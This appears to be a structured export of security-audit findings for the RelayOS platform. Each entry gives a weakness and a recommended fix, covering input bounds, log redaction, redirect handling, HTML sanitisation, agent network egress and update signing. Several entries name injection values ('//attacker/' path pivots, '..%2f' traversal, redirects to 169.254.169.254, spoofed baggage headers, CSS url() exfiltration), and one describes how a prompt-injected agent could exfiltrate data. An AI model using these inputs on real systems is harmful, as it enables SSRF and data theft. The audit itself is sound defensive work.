entries.detail: POST /rpc/<name> looks up the registry and returns CAPABILITY_NOT_FOUND (404) before prepareRequest/resolveContext. An unauthenticated caller can distinguish unknown names (404) from registered ones (401/403 after auth), enumerating the capability inventory that GET /rpc/_meta intentionally protects behind metadataPermission because it is part of the authority surface.
entries.recommendedFix: For unknown capabilities, still run session/bearer authentication (or a generic auth gate) and return 401 when unauthenticated; only return CAPABILITY_NOT_FOUND after a successful authenticated context, matching the _meta confidentiality model.

entries.title: All id fields (anchorType/anchorId/artifactId/runId) are unconstrained z.string() — empty + arbitrarily long values pass
entries.normalizedTitle: all id fields anchortype anchorid artifactid runid are unconstrained z string empty arbitrarily long values pass
entries.detail: All id fields (anchorType/anchorId/artifactId/runId) are unconstrained z.string() — empty + arbitrarily long values pass. Low-risk (dispatcher enforces permission + parameterized DB) but no defense-in-depth against malformed/oversized ids. Fix: z.string().min(1).max(n) + format regex where known; ensure handlers scope by ctx.tenantId regardless of supplied ids. ---
entries.recommendedFix: z.string().min(1).max(n) + format regex where known; ensure handlers scope by ctx.tenantId regardless of supplied ids. ---

entries.title: artifacts.submit body and runAnchors lack schema size bounds
entries.normalizedTitle: artifacts submit body and runanchors lack schema size bounds
entries.detail: Authenticated callers with artifacts:write can submit body: z.unknown() and runAnchors with unbounded anchorType/anchorId strings. Abuse path: craft a max-size RPC request (HTTP path capped at RPC_MAX_REQUEST_BODY_BYTES=1MiB) to amplify storage/indexing/render cost per submit. Currently unreachable from unauthenticated callers and bounded by the transport body limit; becomes higher impact if a non-HTTP control transport omits that cap or if bulk submit automation is granted artifacts:write.
entries.recommendedFix: Bound body (e.g. size/depth limits or artifact-type-specific schemas) and cap runAnchors length plus anchorType/anchorId string max lengths at the shared spec.

entries.title: extension.author.start brief has no max length
entries.normalizedTitle: extension author start brief has no max length
entries.detail: brief is z.string().min(1) only. Abuse path: authenticated artifacts:write caller sends a near-1MiB brief (RPC body limit), which the runtime stores as the authoring artifact and feeds into the authoring agent—amplifying storage and model cost. Unreachable without artifacts:write and capped today by RPC_MAX_REQUEST_BODY_BYTES; severity rises if body limits increase or authoring is exposed to lower-trust automation.
entries.recommendedFix: Use z.string().min(1).max(N) with a product-chosen N (e.g. 10_000–100_000) matching the authoring UI.

entries.title: extension.author.reply text has no max length
entries.normalizedTitle: extension author reply text has no max length
entries.detail: text is z.string().min(1) only. Abuse path: authenticated gates:write caller posts large reply text into an open discussion gate, amplifying run/gate storage and downstream model tokens up to the RPC body cap. Unreachable without gates:write and transport-capped today; worsens if multi-turn replies stack large payloads without per-field limits.
entries.recommendedFix: Use z.string().min(1).max(N) consistent with start.brief and gate note limits.

entries.title: jobs.list limit is unbounded z.number()
entries.normalizedTitle: jobs list limit is unbounded z number
entries.detail: limit is z.number().optional() with no int/min/max. Abuse path: authenticated jobs:read caller passes a very large limit; the daemon handler forwards it to SQL LIMIT and returns full JobRecord rows (including input/result). Unreachable without jobs:read and tenant-scoped; low impact while job volume is small, higher if the table grows or jobs:read is granted to untrusted automation. Sibling specs (e.g. environment-builds) already use .int().min(1).max(100).
entries.recommendedFix: Change to z.number().int().min(1).max(100) (or max(500)) and clamp again in the store.

entries.title: Runner invite ttlSeconds has no upper bound
entries.normalizedTitle: runner invite ttlseconds has no upper bound
entries.detail: runners.invite input allows any positive int for ttlSeconds; INVALID_TTL only documents positivity. Daemon createMachineInvite likewise only rejects non-positive TTL (default 1h). Unlike identity invites (min 300 / max 604_800s), a runners:admin caller can mint a single-use enrollment rawToken valid for years. If that token leaks (chat, ticket, clipboard) an attacker can register a runner into the tenant until first use or revoke.
entries.recommendedFix: Constrain the schema (e.g. ttlSeconds: z.number().int().positive().max(86_400) or max(604_800) matching identity invites) and reject over-max with INVALID_TTL; keep a short default (1h).

entries.title: Full CLI command and failure I/O logged unredacted
entries.normalizedTitle: full cli command and failure i o logged unredacted
entries.detail: console.log always prints the full argv (including the rendered user/system prompt and artifact metadata) and on non-zero exit dumps complete stdout/stderr via JSON.stringify. API keys stay in env (not argv), but tenant goals, artifact titles/paths, and model output land in runner logs. Abuse path: any principal/system with runner log access reads cross-run tenant content that is not otherwise exposed by the run summary.
entries.recommendedFix: Gate command/stdout/stderr logging behind an explicit debug flag; log only exit code + truncated/redacted snippets by default.

entries.title: Unbounded CLI stdout/stderr capture with no driver timeout
entries.normalizedTitle: unbounded cli stdout stderr capture with no driver timeout
entries.detail: runCommand concatenates every stdout/stderr chunk into unbounded strings and only terminates the child via ctx.abortSignal. A hung or extremely chatty claude process can exhaust runner memory or pin a job until an outer deadline fires. Currently low because the child is the trusted vendor CLI under daemon abort control, not raw untrusted network input; becomes medium if abort deadlines are missing or a compromised MCP/tool can flood the CLI pipes.
entries.recommendedFix: Cap captured bytes (drop or fail past N MiB) and enforce a driver-level wall-clock kill timer in addition to abortSignal.

entries.title: Codex -c overrides interpolate values without config escaping
entries.normalizedTitle: codex c overrides interpolate values without config escaping
entries.detail: providerConfigFlags and model_reasoning_effort embed id/name/baseUrl/effort inside double-quoted -c strings; mcp_servers.${serverName} interpolates the key path unescaped (url alone uses JSON.stringify). Callers shellEscape each argv token so this is not shell injection, but a quote/newline/dot-path in name, effort, or serverName can break or inject additional codex config keys (e.g. repoint model_providers.*.base_url while RELAYOS_CODEX_RELAY_KEY still holds the provider key). Currently low: production id/baseUrl/envKey/wireApi are driver-hardcoded or loopback, effort is schema-enum, name/serverName come from catalog/MCP registry—not workflow text. Becomes medium if those fields become package- or user-controlled without validation.
entries.recommendedFix: JSON.stringify or TOML-escape every -c value; validate id/serverName against ^[A-Za-z0-9_-]+$ before building key paths; re-validate reasoningEffort against the enum at runtime.

entries.title: sessionId accepted as opaque resume token
entries.normalizedTitle: sessionid accepted as opaque resume token
entries.detail: On the resume path, sessionId is passed as a positional argv with no format check. It is shell-escaped by the driver (no shell injection). Noted only because a malformed id yields confusing CLI failures rather than a structured driver error; no cross-session abuse without a daemon identity bug.
entries.recommendedFix: Optionally validate sessionId against the expected id pattern (e.g. UUID) before invoking codex exec resume.

entries.title: Full codex command and stdout/stderr logged on fail and success
entries.normalizedTitle: full codex command and stdout stderr logged on fail and success
entries.detail: Logs the complete command line (prompt embedded) always; on failure dumps stdout/stderr; on success also logs full stdout/stderr after parse. Provider API key is only in env/relay (not argv), but prompts, artifact metadata, and model JSONL—including structured outputs—are written unredacted to runner logs on every run. Abuse path: log collectors/operators observe tenant run content beyond the stored summary.
entries.recommendedFix: Debug-gate verbose logs; on success log parse status only; truncate/redact failure I/O.

entries.title: Unbounded codex stdout/stderr buffering without local timeout
entries.normalizedTitle: unbounded codex stdout stderr buffering without local timeout
entries.detail: runCommand accumulates all CLI output in memory and relies solely on abortSignal for cancellation. A stuck or verbose codex/codex-relay child can exhaust runner RSS or hold the job open. Low today because the binary is trusted and outer job leases/abort usually bound runtime; severity rises if abort is absent or output volume is attacker-influenced via tools.
entries.recommendedFix: Byte-cap captured pipes and add a driver max-runtime SIGTERM/SIGKILL path.

entries.title: Managed-agent environment hardcodes unrestricted networking
entries.normalizedTitle: managed agent environment hardcodes unrestricted networking
entries.detail: resolveEnvironment POSTs config.networking.type='unrestricted' when creating the Anthropic cloud environment. The agent runs on Anthropic infrastructure with open egress that RelayOS cannot intermediate. A prompt-injected or malicious agent can call arbitrary hosts (data exfil, callback to attacker, probing) via that environment or via MCP tools.
entries.recommendedFix: Make networking posture configurable (prefer allowlisted/restricted egress by default); only enable unrestricted when an operator explicitly opts in, and document the tradeoff.

entries.title: MCP authorization tokens and headers forwarded to Anthropic
entries.normalizedTitle: mcp authorization tokens and headers forwarded to anthropic
entries.detail: createSession maps request.mcpServers into Anthropic /v1/sessions, including authorization_token and arbitrary headers. Managed Agents call MCP from Anthropic's infra, so tenant MCP credentials leave the RelayOS trust boundary. Abuse path: any secret bound into a managed-agent MCP server is disclosed to Anthropic (and to any Anthropic-side compromise). Currently intentional/documented; reachable whenever a resolver attaches credentialed MCP bindings.
entries.recommendedFix: Keep as explicit product tradeoff: warn in docs/UI that this driver forwards MCP credentials to Anthropic; prefer gateway-mediated MCP for secrets that must not leave RelayOS.

entries.title: fetch follows redirects while sending x-api-key
entries.normalizedTitle: fetch follows redirects while sending x api key
entries.detail: requestJson/requestStream call fetch(dispatch.baseUrl+path) with default redirect:'follow' and headers including x-api-key. Node/undici strips Authorization on cross-origin redirects but not custom headers, so a 3xx from the configured baseUrl can resend the API key to an attacker-chosen host. Unreachable from untrusted input today because baseUrl comes from daemon-resolved sealed provider bindings (operator/catalog trust); becomes medium if baseUrl is tenant-influenced or a catalog host is compromised into redirecting.
entries.recommendedFix: Set redirect:'error' or 'manual' and reject 3xx; if redirects must be followed, re-validate the target origin against an allowlist and drop x-api-key on cross-origin hops.

entries.title: SSE reader buffers events without size/count caps
entries.normalizedTitle: sse reader buffers events without size count caps
entries.detail: readSseEvents accumulates the full stream into memory (buffer + events[]) until a terminal idle/error or stream end, with no max bytes/events. A hostile or buggy upstream (or a baseUrl under attacker control) can OOM the runner process. Not reachable from workflow input while the Anthropic catalog endpoint is trusted.
entries.recommendedFix: Cap total SSE bytes and event count; abort and fail the run when limits are exceeded.

entries.title: Property access cursor[segment.name] permits __proto__, constructor, prototype
entries.normalizedTitle: property access cursor segment name permits proto constructor prototype
entries.detail: Property access cursor[segment.name] permits __proto__, constructor, prototype. This is a read-only traversal (values read, never assigned) so it cannot pollute prototypes; impact is benign ($.__proto__ returns Object.prototype, then JSON-serialized into an artifact / matched against a failure matcher). No RCE, no pollution. - Fix (hardening): reject __proto__/constructor/prototype segment names, or guard with Object.prototype.hasOwnProperty.call(cursor, name) so special keys resolve to undefined.
entries.recommendedFix: reject __proto__/constructor/prototype segment names, or guard with Object.prototype.hasOwnProperty.call(cursor, name) so special keys resolve to undefined.

entries.title: Number.parseInt allows large indices; harmless for read access (returns undefined)
entries.normalizedTitle: number parseint allows large indices harmless for read access returns undefined
entries.detail: Number.parseInt allows large indices; harmless for read access (returns undefined). No fix needed. ---
entries.recommendedFix: Disposition requires current source review.

entries.title: Request URL is buildUrl(baseUrl, renderText(pathTemplate, inputs))
entries.normalizedTitle: request url is buildurl baseurl rendertext pathtemplate inputs
entries.detail: Request URL is buildUrl(baseUrl, renderText(pathTemplate, inputs)). baseUrl/pathTemplate are manifest-pinned (the contract calls this a "hard security boundary"), so host isn't directly user-controlled. But pathTemplate can embed ${ports.X.text} placeholders whose values come from upstream artifact bodies (often agent/LLM-produced), and buildUrl doesn't encode the substituted value — so //attacker/, ..%2f..%2f, or ?/# injection enables path traversal / endpoint pivoting within the pinned host and query smuggling. (Authority override is blocked because the value is appended after baseUrl.) - Fix: encodeURIComponent (strict path-segment encoder) on rendered path values before concatenation, and assert the final parsed URL's origin equals the pinned baseUrl origin.
entries.recommendedFix: encodeURIComponent (strict path-segment encoder) on rendered path values before concatenation, and assert the final parsed URL's origin equals the pinned baseUrl origin.

entries.title: fetch(request.url, …) uses default redirect: "follow"
entries.normalizedTitle: fetch request url uses default redirect follow
entries.detail: fetch(request.url, …) uses default redirect: "follow". A 3xx from the pinned host can redirect to an internal/metadata host (169.254.169.254, localhost) and the body is then read + extracted. - Fix: set redirect: "manual" / "error"; reject or re-validate the redirect target against an origin allowlist before following.
entries.recommendedFix: set redirect: "manual" / "error"; reject or re-validate the redirect target against an origin allowlist before following.

entries.title: On HTTP ≥400 the failure summary includes truncate(response.body, 240)
entries.normalizedTitle: on http 400 the failure summary includes truncate response body 240
entries.detail: On HTTP ≥400 the failure summary includes truncate(response.body, 240). Credentials are sent in the request, not echoed, but a misbehaving upstream could reflect a token into its error body and it would surface in the run summary. - Fix: redact known-secret substrings from summaries.
entries.recommendedFix: redact known-secret substrings from summaries.

entries.title: await response.text() reads the full body with no size cap; a hostile/large response can exhaust memory
entries.normalizedTitle: await response text reads the full body with no size cap a hostile large response can exhaust memory
entries.detail: await response.text() reads the full body with no size cap; a hostile/large response can exhaust memory. (Request is timeout-bounded — good.) - Fix: cap body read length (stream + abort past N bytes).
entries.recommendedFix: cap body read length (stream + abort past N bytes).

entries.title: The browser telemetry API describes exporterHeaders as suitable for bearer tokens for paid drivers
entries.normalizedTitle: the browser telemetry api describes exporterheaders as suitable for bearer tokens for paid drivers
entries.detail: The browser telemetry API describes exporterHeaders as suitable for bearer tokens for paid drivers. In browser code those headers are visible to users and devtools, so the API nudges callers toward exposing backend ingest secrets. Fix: Make the docs/type comment explicit that only public/proxy-scoped tokens are allowed; steer secret-bearing exporters through a server/edge gateway.
entries.recommendedFix: Make the docs/type comment explicit that only public/proxy-scoped tokens are allowed; steer secret-bearing exporters through a server/edge gateway.

entries.title: Sensitive-key denylist misses client_secret and related OAuth fields
entries.normalizedTitle: sensitive key denylist misses client secret and related oauth fields
entries.detail: SENSITIVE_LOG_KEYS/DEFAULT_REDACT_PATHS redact exact names like secret/apiKey/token but not client_secret, clientSecret, sessionToken, or accessKey. Platform secret-material checks already treat client_secret/clientSecret as high-confidence secrets, and credential docs mention multi-field AWS payloads (accessKey/sessionToken). Values for those fields are often arbitrary secrets that do not match DEFAULT_REDACT_PATTERNS, so logger.error({ client_secret: oauthSecret }, ...) or similar would emit the secret. Currently low because redaction is defense-in-depth and requires application code to log those field names; becomes medium wherever OAuth/AWS credential objects are logged under those keys.
entries.recommendedFix: Add client_secret, clientsecret, sessiontoken, accesskey (and matching DEFAULT_REDACT_PATHS entries like *.client_secret/*.clientSecret/*.sessionToken/*.accessKey) to the exact-key denylist used by isSensitiveLogKey.

entries.title: Client W3C baggage is extracted into active OTel context
entries.normalizedTitle: client w3c baggage is extracted into active otel context
entries.detail: headersToCarrier forwards client baggage/traceparent into withExtractedContext. Nested runWithRuntimeContext({ requestId }) clears ALS of spoofed account/identity fields, but OTel baggage on the active context retains client relayos.* entries. injectIntoCarrier only overwrites baggage keys present on RuntimeContext, so unset fields (e.g. run_id/workflow_id/account_id before auth enrichment) can be re-propagated to runners/downstream via injectIntoCarrier used by the frame engine. Abuse path: send baggage: relayos.account_id=.../relayos.run_id=... to poison telemetry correlation across services. Currently low because baggage is not used as an authorization decision source (auth is handler/resolveContext); becomes medium if any consumer treats baggage identity fields as trusted authn.
entries.recommendedFix: When extracting inbound HTTP carriers, drop or namespace-strip relayos.* baggage keys (or rebuild baggage from server-resolved RuntimeContext only after auth) before continuing the request.

entries.category: xss / css injection into host document
entries.title: 'style' is in ALLOWED_TAGS without allowVulnerableTags
entries.normalizedTitle: style is in allowed tags without allowvulnerabletags
entries.detail: 'style' is in ALLOWED_TAGS without allowVulnerableTags. sanitize-html (2.17.3) passes <style> body through UNESCAPED/UNFILTERED when allowlisted; allowedStyles only filters inline style= attrs, NOT <style> contents. This sanitized HTML is injected same-document via dangerouslySetInnerHTML (ReviewBodyRenderer.tsx:250, renderMode:'html' path — NOT the sandboxed iframe), so an untrusted extension renderer can ship global unscoped CSS reaching the RelayOS host: position:fixed full-viewport overlays (clickjacking/UI-redress of review/approve controls), @import/url() CSS exfil, host-chrome restyling. Breaks the documented renderMode:'html' guarantee (security-model.mdx:113). Fix: Remove 'style' from ALLOWED_TAGS (style via the already-url()-filtered inline style= attr). If a <style> block is truly needed, render that fragment only via the sandboxed iframe, or scope/sanitize CSS (strip @import/url()/expression, namespace selectors). Never set allowVulnerableTags.
entries.recommendedFix: Remove 'style' from ALLOWED_TAGS (style via the already-url()-filtered inline style= attr). If a <style> block is truly needed, render that fragment only via the sandboxed iframe, or scope/sanitize CSS (strip @import/url()/expression, namespace selectors). Never set allowVulnerableTags.

entries.title: <a target rel> allowed but rel not forced to noopener
entries.normalizedTitle: a target rel allowed but rel not forced to noopener
entries.detail: <a target rel> allowed but rel not forced to noopener. Since extension-html renders same-document, <a target=_blank> without rel lets the opened page access window.opener of the host window (can navigate the host tab). javascript: already blocked, so opener abuse not script exec. Fix: transformTags on 'a' to force rel='noopener noreferrer nofollow' when target present, or drop target. ---

entries.title: Self-update downloads the runner binary and verifies it against SHA256SUMS, but SHA256SUMS is fetched over the same TLS channel from the same host (dl.relayos.work) with NO independent/detached signature (no code-signing/Ed25519/PGP)
entries.normalizedTitle: self update downloads the runner binary and verifies it against sha256sums but sha256sums is fetched over the same tls channel from the same host dl relayos work with no independent detached signature no code signing ed25519 pgp
entries.detail: Self-update downloads the runner binary and verifies it against SHA256SUMS, but SHA256SUMS is fetched over the same TLS channel from the same host (dl.relayos.work) with NO independent/detached signature (no code-signing/Ed25519/PGP). The checksum only protects against transport corruption, not a compromised/substituted release host: anyone who can serve dl.relayos.work (host compromise, TLS MITM, DNS/CDN takeover) delivers a malicious binary + matching SHA256SUMS and it becomes the running executable → runner-host RCE. Fix: Embed a release-signing public key in the runner build; publish SHA256SUMS.sig (detached) and verify it against the pinned key before trusting the checksum; treat the download host as untrusted for integrity.
entries.recommendedFix: Embed a release-signing public key in the runner build; publish SHA256SUMS.sig (detached) and verify it against the pinned key before trusting the checksum; treat the download host as untrusted for integrity.

entries.detail: version.json and the checksum are all rooted solely in TLS trust of dl.relayos.work with no pinning. Fail-closed on missing checksum (good), but the whole channel's integrity depends on TLS alone. Companion to the medium; signing the manifest closes both. Fix: Sign the version manifest + checksum; verify with a pinned key independent of TLS.
entries.recommendedFix: Sign the version manifest + checksum; verify with a pinned key independent of TLS.
